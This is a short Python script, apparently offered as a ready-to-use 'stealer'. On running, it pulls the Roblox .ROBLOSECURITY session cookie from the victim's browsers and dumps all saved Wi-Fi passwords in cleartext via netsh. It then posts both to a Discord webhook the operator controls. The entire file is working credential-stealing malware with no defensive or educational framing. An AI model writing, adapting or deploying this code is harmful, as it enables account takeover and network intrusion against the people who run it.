import browser_cookie3
import json
import requests
import subprocess

def GetWifiPasswords():
    try:
        # Execute the system command to retrieve Wi-Fi passwords
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
        output = result.stdout

        # Find all Wi-Fi profiles
        profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]

        # Retrieve passwords for each Wi-Fi profile
        wifi_passwords = []
        for profile in profiles:
            result = subprocess.run(["netsh", "wlan", "show", "profile", "name=" + profile, "key=clear"], capture_output=True, text=True)
            output = result.stdout

            password_line = [line.split(":")[1].strip() for line in output.split("\n") if "Key Content" in line]
            if password_line:
                wifi_passwords.append((profile, password_line[0]))

        return wifi_passwords
    except Exception as e:
        print("Failed to retrieve Wi-Fi passwords:", str(e))
        return []

def SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords):
    payload = {
        "embeds": [
            {
                "title": "Dev stealer caught a .ROBLOSECURITY Cookie!",
                "description": f"```{roblosecurity_cookie}```",
                "color": 0x00FF00
            },
            {
                "title": "Dev stealer got Wi-Fi Passwords!",
                "description": f"".join([f"```{profile}: {password}```" for profile, password in wifi_passwords]),
                "color": 0x00FF00
            }
        ]
    }

    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

    if response.status_code == 204:
        print("Data sent to Discord webhook successfully.")
    else:
        print("Failed to send data to Discord webhook.")

def Main():
    webhook_url = "Your webhook url"

    # Get the .ROBLOSECURITY cookie
    roblosecurity_cookie = None
    cookies = browser_cookie3.load()
    for cookie in cookies:
        if cookie.name == ".ROBLOSECURITY":
            roblosecurity_cookie = cookie.value
            break

    if roblosecurity_cookie:
        print(".ROBLOSECURITY:", roblosecurity_cookie)

        # Get Wi-Fi passwords
        wifi_passwords = GetWifiPasswords()

        # Send data to Discord webhook
        SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords)
    else:
        print(".ROBLOSECURITY cookie not found")

Main()
